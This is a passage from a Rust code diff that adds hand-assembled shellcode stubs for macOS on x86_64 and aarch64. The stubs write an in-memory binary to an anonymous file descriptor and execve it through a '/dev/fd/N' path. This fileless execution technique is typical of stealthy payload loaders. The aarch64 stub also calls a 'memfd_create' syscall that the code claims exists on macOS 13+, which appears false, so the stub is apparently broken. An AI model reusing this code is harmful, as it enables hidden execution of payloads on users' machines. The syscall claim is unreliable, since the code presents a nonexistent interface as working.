+    code.extend_from_slice(&[0x31, 0xd2]);
+    // mov ecx, 10
+    code.extend_from_slice(&[0xb9, 0x0a, 0x00, 0x00, 0x00]);
+    // div rcx (rax = quotient, rdx = remainder)
+    code.extend_from_slice(&[0x48, 0xf7, 0xf1]);
+    // add dl, 0x30 ('0')
+    code.extend_from_slice(&[0x80, 0xc2, 0x30]);
+    // mov [r8], dl
+    code.extend_from_slice(&[0x41, 0x88, 0x10]);
+    // test rax, rax
+    code.extend_from_slice(&[0x48, 0x85, 0xc0]);
+    // jnz .itoa_loop (back to itoa_loop_start)
+    code.extend_from_slice(&[0x75, 0x00]); // placeholder for rel8
+    let loop_size = (code.len() + 2 - itoa_loop_start) as u8;
+    code[code.len() - 1] = loop_size.wrapping_neg();
+
+    // Prepend "/dev/fd/" in reverse order (last char first)
+    for &ch in &[0x2f, 0x64, 0x66, 0x2f, 0x76, 0x65, 0x64, 0x2f] {
+        // dec r8
+        code.extend_from_slice(&[0x49, 0xff, 0xc8]);
+        // mov byte [r8], ch
+        code.extend_from_slice(&[0x41, 0xc6, 0x00, ch]);
     }
 
-    #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
-    anyhow::bail!("build_macos_execve_stub: unsupported architecture")
+    // mov rdi, r8 (path pointer for execve)
+    code.extend_from_slice(&[0x4c, 0x89, 0xc7]);
+
+    // === Step 4: execve(path, NULL, NULL) ===
+    // xor esi, esi (argv=NULL)
+    code.extend_from_slice(&[0x31, 0xf6]);
+    // xor edx, edx (envp=NULL)
+    code.extend_from_slice(&[0x31, 0xd2]);
+    // mov rax, 0x2000000 + 59 (SYS_execve)
+    code.extend_from_slice(&[0x48, 0xb8]);
+    code.extend_from_slice(&(0x2000000u64 + 59).to_le_bytes());
+    // syscall
+    code.extend_from_slice(&[0x0f, 0x05]);
+
+    // === Step 5: exit(1) fallback ===
+    // mov edi, 1
+    code.extend_from_slice(&[0xbf, 0x01, 0x00, 0x00, 0x00]);
+    // mov rax, 0x2000000 + 1 (SYS_exit)
+    code.extend_from_slice(&[0x48, 0xb8]);
+    code.extend_from_slice(&(0x2000000u64 + 1).to_le_bytes());
+    // syscall
+    code.extend_from_slice(&[0x0f, 0x05]);
+
+    code
+}
+
+/// macOS aarch64 memfd+execve shellcode.
+/// Uses BSD syscall ABI: syscall number in x16, invoke via `svc #0x80`.
+#[cfg(all(target_os = "macos", target_arch = "aarch64"))]
+fn build_macos_memfd_stub_aarch64(binary_addr: u64, binary_len: usize) -> Vec<u8> {
+    let mut insts: Vec<u32> = Vec::new();
+
+    // === Step 1: memfd_create("", MFD_CLOEXEC) ===
+    // sub sp, sp, #16 (space for empty string)
+    insts.push(0xD10043FF);
+    // str xzr, [sp] (NUL-terminated empty string)
+    insts.push(0xF90003FF);
+    // mov x0, sp (add x0, sp, #0)
+    insts.push(0x910003E0);
+    // movz x1, #1 (MFD_CLOEXEC)
+    insts.push(0xD2800001);
+    // movz x16, #518 (SYS_memfd_create, macOS 13+)
+    insts.push(0xD28040D0);
+    // svc #0x80
+    insts.push(0xD4000001);
+    // mov x11, x0 (save fd)
+    insts.push(0xAA0003EB);
+
+    // === Step 2: write(fd, binary_addr, binary_len) ===
+    // mov x0, x11 (fd)
+    insts.push(0xAA0B03E0);
+    // mov x1, binary_addr
+    aarch64_load_64(&mut insts, 1, binary_addr);
+    // mov x2, binary_len
+    aarch64_load_64(&mut insts, 2, binary_len as u64);
+    // movz x16, #4 (SYS_write)
+    insts.push(0xD2800090);
+    // svc #0x80
+    insts.push(0xD4000001);
+
+    // === Step 3: Build "/dev/fd/N" path on stack via itoa ===
+    // sub sp, sp, #32 (path buffer)
+    insts.push(0xD10083FF);
+    // add x12, sp, #31 (point to last byte of buffer)
+    insts.push(0x91007FEC);
+    // strb wzr, [x12] (NUL terminator)
+    insts.push(0x3900019F);
+    // mov x0, x11 (fd for itoa)
+    insts.push(0xAA0B03E0);
+    // movz x13, #10 (divisor for decimal conversion)
+    insts.push(0xD280014D);
+
+    // itoa loop: convert fd to decimal digits right-to-left
+    let itoa_start = insts.len();
+    // sub x12, x12, #1
+    insts.push(0xD100058C);
+    // udiv x14, x0, x13 (quotient)
+    insts.push(0x9AC00800 | (13u32 << 16) | 14u32);
+    // msub x15, x14, x13, x0 (remainder = x0 - x14*x13)
+    insts.push(0x9B200000 | (13u32 << 16) | (14u32 << 5) | 15u32);
+    // add x15, x15, #0x30 (ASCII '0')
+    insts.push(0x9100C1EF);
+    // strb w15, [x12]
+    insts.push(0x3900018F);
+    // mov x0, x14 (quotient becomes next dividend)
+    insts.push(0xAA0E03E0);
+    // cbnz x0, itoa_start
+    let back_offset = (insts.len() - itoa_start) as u32;
+    let imm19 = (0x80000u32.wrapping_sub(back_offset)) & 0x7FFFF;
+    insts.push(0xB5000000 | (imm19 << 5));
+
+    // Prepend "/dev/fd/" in reverse order
+    for &ch in &[0x2fu8, 0x64, 0x66, 0x2f, 0x76, 0x65, 0x64, 0x2f] {
+        // sub x12, x12, #1
+        insts.push(0xD100058C);
+        // movz w15, #ch
+        insts.push(0x52800000u32 | ((ch as u32) << 5) | 15);
+        // strb w15, [x12]
+        insts.push(0x3900018F);
+    }
+
+    // mov x0, x12 (path pointer)
+    insts.push(0xAA0C03E0);
+
+    // === Step 4: execve(path, NULL, NULL) ===
+    // movz x1, #0 (argv=NULL)
+    insts.push(0xD2800001);
+    // movz x2, #0 (envp=NULL)
+    insts.push(0xD2800002);
+    // movz x16, #59 (SYS_execve)
+    insts.push(0xD2800770);
+    // svc #0x80
+    insts.push(0xD4000001);
+
+    // === Step 5: exit(1) fallback ===
+    // movz x0, #1
+    insts.push(0xD2800020);
+    // movz x16, #1 (SYS_exit)
+    insts.push(0xD2800030);
+    // svc #0x80
+    insts.push(0xD4000001);
+
+    // Convert instruction words to little-endian bytes
+    insts.iter().flat_map(|i| i.to_le_bytes()).collect()
+}
+
+/// Emit movz/movk instruction sequence to load a 64-bit immediate into an
+/// aarch64 register.
+#[cfg(target_os = "macos")]
+fn aarch64_load_64(insts: &mut Vec<u32>, rd: u32, val: u64) {
+    let mut first = true;
+    for shift in (0..=48).step_by(16) {
+        let imm16 = ((val >> shift) & 0xFFFF) as u16;
+        if first {
+            // movz xd, #imm16, LSL #shift
+            insts.push(
+                0xD2800000u32 | ((shift as u32 / 16) << 21) | ((imm16 as u32) << 5) | rd,
+            );
+            first = false;
+        } else if imm16 != 0 {
+            // movk xd, #imm16, LSL #shift
+            insts.push(
+                0xF2800000u32 | ((shift as u32 / 16) << 21) | ((imm16 as u32) << 5) | rd,
+            );
+        }
+    }
+    if first {
+        // Value was zero; emit movz xd, #0
+        insts.push(0xD2800000 | rd);
+    }
 }
 
 #[cfg(windows)]
